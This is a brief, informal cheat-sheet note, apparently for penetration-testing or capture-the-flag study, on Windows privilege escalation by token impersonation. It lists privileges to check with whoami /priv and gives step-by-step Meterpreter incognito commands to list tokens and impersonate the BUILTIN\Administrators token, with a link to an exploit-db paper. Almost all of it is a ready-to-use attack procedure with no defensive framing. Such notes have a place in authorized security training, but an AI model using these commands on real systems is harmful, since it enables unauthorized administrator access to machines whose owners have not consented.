 - in a windows shell, run the whoami /priv command to see all privileges

if any of these come upt you are gtg:
    SeImpersonatePrivilege
    SeAssignPrimaryPrivilege
    SeTcbPrivilege
    SeBackupPrivilege
    SeRestorePrivilege
    SeCreateTokenPrivilege
    SeLoadDriverPrivilege
    SeTakeOwnershipPrivilege
    SeDebugPrivilege

 - from here, in the meterpreter shell load the incognito module with "load incognito"
 - To check which tokens are available, enter the list_tokens -g. We can see that the BUILTIN\Administrators token is available. 
 - Use the impersonate_token "BUILTIN\Administrators" command to impersonate the Administrators' token
   
   more information: https://www.exploit-db.com/papers/42556